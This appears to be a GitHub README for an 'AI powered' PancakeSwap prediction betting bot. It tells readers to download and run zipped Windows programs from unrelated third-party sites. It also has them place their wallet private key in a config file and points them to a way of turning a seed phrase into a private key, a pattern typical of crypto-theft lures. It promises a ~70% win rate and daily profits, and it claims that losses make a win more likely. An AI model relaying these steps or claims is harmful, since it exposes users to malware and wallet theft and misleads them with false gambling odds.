  
# 🔮🚀 PancakeSwap Prediction Bot (SMART AI powered) v6.0

![PancakeSwap-Logo](/images/logo.jpg?raw=true)

PancakeSwap Prediction Bot using AI recommendations.

## ⭐Please consider giving a **star**.

###  Evidences dated 13 JANUARY 2023
![Winning rate](/images/1.png?raw=true)
![Winning rate](/images/2.jpg?raw=true)

## 💡 Ready click-to-run version for Windows 🥞
1. Download the [Easy run version](https://coinsw.app/PancakePredictionBot.zip).
2. Extract the bot program from the zip archive and run it.
3. Enjoy!

## 💡 Ready click-to-run with UI version for Windows 🥞
1. Download the [Easy run with UI version](https://tryenom.com/predict).
2. Extract the bot program from the zip archive and run it.
3. Enjoy!

or

## 🐰⚡ Installation

Download and Install Node here:
https://nodejs.org/en/download/

Then run the following commands in terminal or CMD:

1. ``git clone https://github.com/PredictionSmartBot/PancakeswapPredictWinnerBot`` 
2. ``cd PancakeswapPredictWinnerBot``
3. ``npm i``
4. ``npm run start``

## ⚙️ Setup Way I {No private key required} (**Recommended**)

1. Open the **.env** file with any code/text editor and delete private key like so:
```
PRIVATE_KEY=""
(For using "ABM (Automatic Browser Mode)", leave this blank.)
```
3. Open the **bot.js** file and setup the following variables:
```
BET_AMOUNT: 20, // Amount of each bet (In USD)
```
4. Start the bot using `npm start` or `yarn start`
5. Enjoy!

Or

## ⚙️ Setup Way II

1. Open the **.env** file with any code/text editor and add your private key like so:
```
PRIVATE_KEY="0x9bc5ea9a562056a171dce0dd57834edafb70d45c2e570d355be5c1a781218724"
(If you are using automatic browser mode, leave this blank!)
```
3. Open the **bot.js** file and setup the following variables:
```
BET_AMOUNT: 20, // Amount of each bet (In USD)
```
4. Start the bot using `npm start` or `yarn start`
5. Enjoy!

### 🔓 How to convert seed phrase to Private Key
A lot of wallets don't provide you the private key, but just the **seed phrase** ( 12 words ). So here you will learn how to convert that to a private key:
1. Enter [Here](https://youtu.be/eAXdLEZFbiw) and follow the instructions. Website used is [this one](https://iancoleman.io/bip39/).


## 🤖📈 Strategy
- The bot take a series of recommendations given by Trading View and process them together with the tendency of the rest of people betting. After the algorithm have complete, it choose to bet Up or Down.
- After all my testings in apron 300 rounds I was able to achieve a **~70% Win rate**. Of course it depends of a lot of variables, so I can't ensure that you will reproduce the same behavior. But I can tell that I make $20 - $70 daily with $3 Bets.
- Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
- Also it will save the daily history in the **/history** directory.
- Be aware that after consecutive losses, statistically you have more chances to win in the next one.
- Inside **bot.js** in the ``THRESHOLD`` property of ``GLOBAL_CONFIG`` variable, you can configure the minimum certainty with which the bot will bet. For default it's set to 50, which means that from 50% certainty the bot will bet. You can raise it (50-100) to bet only when the bot is more sure about its prediction.
- Its recommendable to have x10 - x50 the amount of bet to have an average of rounds.


💰You can check the history of rounds and claim rewards here: https://pancakeswap.finance/prediction

## ✔️ To Do 

 - [x] USD Based bet 
 - [x] Show real time profit 
 - [x] Show real time win rate 
 - [x] Improved algorithm v5.0 🔥
 - [x] AI Driven bot 🔥
 - [x] Stop Loss
 - [x] Simplify settings 
 - [x] Auto collect winnings 


## 👁️ Disclaimers

**Please be aware of clones**

 👷**Use it at your own risk.** 
 If you are going to bet, please do it with money that you are willing to lose. And please try to bet with a low amount to gradually generate profit.
